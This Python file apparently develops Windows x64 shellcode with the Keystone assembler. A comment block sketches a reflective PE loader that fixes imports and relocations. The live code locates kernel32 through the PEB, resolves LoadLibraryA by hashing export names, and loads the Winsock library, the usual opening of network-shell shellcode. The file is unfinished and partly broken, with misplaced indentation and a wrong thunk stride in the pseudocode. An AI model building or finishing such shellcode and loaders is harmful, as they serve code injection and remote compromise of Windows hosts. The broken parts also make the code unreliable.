import ctypes, struct
import argparse
from keystone import *

'''
e_lfanew:		DWORD 0x3c
BaseReloc		QWORD [0x3C]+0xb0
ImportDir		WORD [0x3c]+0x90
ImportDirSize		WORD [0x3c]+0x94
EntryPoint:		DWORD [0x3c]+0x28
PreferredAddress:	QWORD [0x3c]+0x30

isDll:			WORD [0x3c]+0x16
IAT			QWORD [0x3c]+0xe8
ExportDir		QWORD [0x3c]+0x88	


ntheader
sectortable		
tlsdir			QWORD [0x3c]+0xd0
exceptiondir		QWORD [0x3c]+0xa0
resourcedir		QWORD [0x3c]+0x98


Entry in ImportDir: 0-3 ILT_RVA  12-15 ModName_RVA 16-19 IAT_RVA
Entry in ILT: (1000000000000000 + FuncOrd) | HintName_RVA
HintName: IndexOfENPT+FuncName
Process: 
1: Access ILT, get HintName_RVA
2: Access HintNameTable, get ENPT Index
3: Get 2nd Index in OT, which is FuncOrd
4: Get func_rva in EAT

OR
1: Access ILT, get FuncOrd
2: Get func_rva in EAT
 


FixIAT()
{
DWORD ImportDir_RVA = PE[PE[0x3c]+0x90]	// ImportDirRVA = e_lfanew + 0x90
QWORD ImportDir = Base + PE[PE[0x3c] + 0x90]	//The first Import Descriptor entry = VA of Import Directory
DWORD ImportDir_Size = PE[PE[0x3c]+0x94]
for(i = ImportDir; i < ImportDir + ImportDir_Size; i = i + 0x14)	//Each entry(dll) is 0x14 bytes
{
	DWORD ILT_RVA = PE[i]	//ILT RVA is the 1st DWORD
	QWORD ILT = Base + PE[i]
	DWORD IAT_RVA = PE[i + 0x10]	// IAT RVA is the 5th DWORD
	QWORD IAT = Base + PE[i + 0x10]
	DWORD Module_Name_RVA = PE[i + 0xc]	// Module Name string RVA is the 4th DWORD
	String Module_Name = Base + PE[i + 0xc]
	QWORD module_addr = LoadLibraryA(Module_Name)
	processedbytes = 0
	while(True)
	{
		ILT_THUNK = ILT + processedbytes
		IAT_THUNK = IAT + processedbytes
		if (IAT_THUNK == 0 && ILT_THUNK ==0)	//The elements in ILT and IAT are both empty
		{
			break
		}	
		
		if(ILT_THUNK >= 1000000000000000)	//The highest bit is 1, import by ord
		{
			Func_Addr = GetProcAddress(module_addr, (ILT_THUNK-1000000000000000))
			
		}
		else
		{
			Func_Name = PE[ILT_THUNK] + 2
			Func_Addr = GetProcAddress(module_addr, Func_Name)
			
		}
		PEP[IAT_THUNK] = Func_Addr
		processedbytes += 0x10
				
	}
	
}
}


BaseReloc Table: Multiple blocks
Number of entries in the block: (Size-0x8)/0x2
Each block: 0-3 Page_RVA, 4-7 Size, 8-Size-1 WORD * Count
In each word: 0-3 bit Type. 4-15 Offset from page
Hardcoded_Address_RVA: PE[Page_RVA  + Offset_from_page]
Hardcoded_Address: 

Fix_Reloc()
{
	DWORD BaseReloc_RVA = PE[PE[0x3c]+0xb0]	// BaseReloc_RVA = e_lfanew + 0xb0
	QWORD BaseReloc = Base + PE[PE[0x3c] + 0xb0]	//BaseReloc VA
	DWORD BaseReloc_Size = PE[PE[0x3c] + 0xb4]	
	QWORD Delta = Base - PE[PE[0x3c] + 0x30]	//Delta of the base address

	PE[PE[0x3c]+ 0x30] = Base	//Update image base

	DWORD Block_RVA =  PE[BaseReloc]	//The first block page RVA
	DWORD Block_Size = PE[BaseReloc + 4]	//The first block's size

	for(i = BaseReloc; i < BaseReloc + BaseReloc_Size; i += Block_Size )	//Iterate all blocks
	{
		Block_RVA =  PE[i]
		Block_Size = PE[i + 4]
		for(j=i+8; j < i + Block_Size; j +=2 )	//Iterate all entries in current block	
		{
			WORD value = PE[j]		//Value in current entry
			if(value > 0)	//The latest one could be 0
			{
				12Bits offset = value[0]	//Offset from page
				4Bits type = value[12]		//Type
				DWORD Reloc_RVA = Block_RVA + offset	//Corresponding RVA of the hardcoded address
				PE[Base + Reloc_RVA] = PE[Base + Reloc_RVA] + Delta	//Patch the hardcoded address, typically		
			}
		}				
	}
}



"get_pe_addr:"
" lea rbx, [rip+0x100];"	# Assume the shellcode stub is 0x100 bytes ahead of PE payload

"iat_init:"
" mov eax, [rbx+0x3c];"		# eax contains e_lfanew
" mov r11, [eax+0x90];"		# r11 contains ImportDir RVA
" add r11, rbx;"		# r11 points to ImportDir
" mov r12, [eax+0x94];"		# r12 contains ImportDir Size
" mov rcx, r11;"		# rcx acts as an index, start from ImportDir
" mov rdx, r11;"
" add rdx, r12;"		# rdx is the upper bond of ImportDir

"import_descriptor_loop:"


"import_descriptor_entry_loop:"



"basereloc_init:"
" mov r14, [eax+0xb0];"		# r14 contains BaseRelocDir RVA
" add r14, rbx;"		# r14 points to BaseRelocDir



'''

	CODE = (
"find_kernel32:"
" xor rdx, rdx;"
" mov rax, gs:[rdx+0x60];"        # RAX stores the value of ProcessEnvironmentBlock member in TEB, which is the PEB address
" mov rsi,[rax+0x18];"        # Get the value of the LDR member in PEB, which is the address of the _PEB_LDR_DATA structure
" mov rsi,[rsi + 0x30];"        # RSI is the address of the InInitializationOrderModuleList member in the _PEB_LDR_DATA structure
" mov r9, [rsi];"        # Current module is python.exe
" mov r9, [r9];"        # Current module is ntdll.dll
" mov r9, [r9+0x10];"        # Current module is kernel32.dll
" jmp jump_section;"

"parse_module:"        # Parsing DLL file in memory
" mov ecx, dword ptr [r9 + 0x3c];"        # R9 stores the base address of the module, get the NT header offset
" xor r15, r15;"
" mov r15b, 0x88;"	# Offset to Export Directory   
" add r15, r9;"
" add r15, rcx;"
" mov r15d, dword ptr [r15];"        # Get the RVA of the export directory
" add r15, r9;"        # R14 stores  the VMA of the export directory
" mov ecx, dword ptr [r15 + 0x18];"        # ECX stores the number of function names as an index value
" mov r14d, dword ptr [r15 + 0x20];"        # Get the RVA of ENPT
" add r14, r9;"        # R14 stores  the VMA of ENPT

"search_function:"        # Search for a given function
" jrcxz not_found;"        # If RCX is 0, the given function is not found
" dec ecx;"        # Decrease index by 1
" xor rsi, rsi;"
" mov esi, [r14 + rcx*4];"        # RVA of function name string
" add rsi, r9;"        # RSI points to function name string

"function_hashing:"        # Hash function name function
" xor rax, rax;"
" xor rdx, rdx;"
" cld;"        # Clear DF flag

"iteration:"        # Iterate over each byte
" lodsb;"        # Copy the next byte of RSI to Al
" test al, al;"        # If reaching the end of the string
" jz compare_hash;"        # Compare hash
" ror edx, 0x0d;"        # Part of hash algorithm
" add edx, eax;"        # Part of hash algorithm
" jmp iteration;"        # Next byte

"compare_hash:"        # Compare hash
" cmp edx, r8d;"
" jnz search_function;"        # If not equal, search the previous function (index decreases)
" mov r10d, [r15 + 0x24];"        # Ordinal table RVA
" add r10, r9;"        # Ordinal table VMA
" movzx ecx, word ptr [r10 + 2*rcx];"        # Ordinal value -1
" mov r11d, [r15 + 0x1c];"        # RVA of EAT
" add r11, r9;"        # VMA of EAT
" mov eax, [r11 + 4*rcx];"        # RAX stores RVA of the function
" add rax, r9;"        # RAX stores  VMA of the function
" ret;"
"not_found:"
" ret;"

"jump_section:"        # Achieve PIC and elminiate 0x00 byte
" mov rbp, r9;"        # RBP stores base address of Kernel32.dll
" mov r8d, 0xec0e4e8e;"        # LoadLibraryA Hash
" call parse_module;"        # Search LoadLibraryA's address
" mov r12, rax;"        # R12 stores the address of LoadLibraryA function

"load_module:"
" xor rax, rax;"
" mov ax, 0x6c6c;"        # Save the string "ll" to RAX
" push rax;"        # Push the string to the stack
" mov rax, 0x642E32335F325357;"        # Save the string "WS2_32.D" to RAX
" push rax;"        # Push the string to the stack
" mov rcx, rsp;"        # RCX points to the "WS2_32.dll" string
" sub rsp, 0x20;"        # Function prologue
" mov rax, r12;"        # RAX stores address of LoadLibraryA function
" call rax;"        # LoadLibraryA("ws2_32.dll")
" add rsp, 0x20;"        # Function epilogue
" mov r14, rax;"        # R14 stores the base address of ws2_32.dll
)
	ks = Ks(KS_ARCH_X86, KS_MODE_64)
	encoding, count = ks.asm(CODE)



